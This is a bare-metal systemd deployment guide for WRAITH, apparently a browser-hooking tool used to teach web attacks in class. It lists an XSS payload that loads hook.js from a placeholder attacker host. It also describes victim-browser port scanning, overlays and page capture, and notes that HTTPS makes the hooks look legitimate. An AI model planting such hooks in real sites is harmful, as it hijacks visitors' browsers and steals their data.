# Bare-metal deploy (systemd)

> Most people should use the **Docker** path instead — from the repo root just run
> `./setup.sh` (see the main [README](../README.md)). This directory is the
> **alternative** for running WRAITH directly on a host under systemd, no
> container.

Set these to your own server before you start:

```bash
export WRAITH_VPS=root@YOUR_VPS_IP          # or user@host
export WRAITH_SSH_KEY=~/.ssh/your_key       # SSH key to reach it
export WRAITH_DEST=/opt/wraith              # where it lives on the box
```

## One-shot (from the project root on your machine)

```bash
bash deploy/deploy.sh
```

That rsyncs the source to `$WRAITH_DEST`, runs `npm install`, installs the systemd
unit, and starts the service. On first run it generates an operator password and
prints it once — save it. Then set the rest of your secrets:

```bash
ssh -i "$WRAITH_SSH_KEY" "$WRAITH_VPS" \
  'nano /opt/wraith/wraith.env && systemctl restart wraith'
```

Set at minimum `WRAITH_OP_USER`, `WRAITH_OP_PASSWORD`, `WRAITH_PUBLIC_URL`
(your IP or domain), and `WRAITH_SECRET` (`openssl rand -hex 32`). The server
**refuses to start** on a public interface without a password, so that step is
mandatory.

Open the port if a firewall is on:

```bash
ssh -i "$WRAITH_SSH_KEY" "$WRAITH_VPS" 'ufw allow 8090'
```

## Manual steps (what the script does)

1. **Copy source** to `$WRAITH_DEST` (exclude `node_modules`, `.git`, `.env`, `data`).
2. **`npm install --omit=dev`** on the host (needs Node.js 18+).
3. **`cp deploy/wraith.env.example wraith.env`**, then edit it (user + password +
   secret + public URL), `chmod 600 wraith.env`.
4. **Install + enable the service:**
   ```bash
   cp deploy/wraith.service /etc/systemd/system/wraith.service
   systemctl daemon-reload && systemctl enable --now wraith
   ```
5. **Logs:** `journalctl -u wraith -f`

## URLs once live

With `WRAITH_PUBLIC_URL=http://YOUR_VPS_IP:8090`:

| What | URL |
|---|---|
| Operator console (login) | `http://YOUR_VPS_IP:8090/operator/` |
| Login page | `http://YOUR_VPS_IP:8090/login` |
| Demo victim page | `http://YOUR_VPS_IP:8090/demo/` |
| Hook payload | `http://YOUR_VPS_IP:8090/hook.js` |

In an XSS/lab payload the hook is:
`"><script src="http://YOUR_VPS_IP:8090/hook.js"></script>`

## Security notes (cover these in class)

- **The operator console is login-gated; the hook, demo, and `/ws/hook` are public
  by design** — victims must be able to load them. That asymmetry is correct.
- **Plain HTTP means the operator password and captured data travel in cleartext.**
  Fine for an isolated classroom, not for anything sensitive. To harden, put it
  behind **nginx + Let's Encrypt** (TLS) and proxy to `127.0.0.1:8090`; then bind
  WRAITH to `127.0.0.1`, let nginx be the only public listener, and set
  `WRAITH_PUBLIC_URL=https://your.domain`. Over HTTPS the session cookie is
  automatically marked `Secure`, and the overlays / `wss://` hook look fully
  legitimate.
- **Rotate `WRAITH_OP_PASSWORD` per cohort** and tear the service down between
  classes (`systemctl stop wraith`) so it isn't a standing open hook endpoint.
- Everything (localhost port scan, overlays, page capture) still works remotely
  because the hook runs in the *victim's* browser regardless of where the server
  lives.
